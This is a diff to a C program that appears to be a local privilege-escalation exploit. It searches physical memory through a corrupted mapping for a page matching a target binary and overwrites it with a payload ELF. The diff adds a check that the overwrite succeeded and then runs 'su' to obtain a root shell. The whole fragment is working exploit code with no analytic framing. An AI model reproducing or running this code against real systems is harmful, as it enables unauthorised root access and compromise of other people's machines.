@@ -191,9 +191,17 @@ int main()
 		//hexdump(glitched_map, 16);
 		if (memcmp(glitched_map, target_mapping, 0x1000) == 0) {
 			printf("\n[+] Found target at phys addr 0x%016lx, patching.\n", paddr);
-			found = 1;
-			memcpy(glitched_map, payload_elf, payload_elf_len);
-			// TODO: check to see if it worked, early exit?
+
+			memcpy(glitched_map, payload_elf, payload_elf_len); // do the patch
+
+			// check to see if it worked
+			if (memcmp(target_mapping, payload_elf, payload_elf_len) == 0) {
+				found = 1;
+				printf("[+] Patch success!\n");
+				break;
+			} else {
+				printf("[*] That didn't seem to work, continuing the search...\n");
+			}
 		}
 	}
 
@@ -204,6 +212,6 @@ int main()
 		return -1;
 	}
 
-	printf("\n[+] About to get root?\n");
+	printf("[+] About to get root?\n");
 	system("su"); // TODO: execve
 }
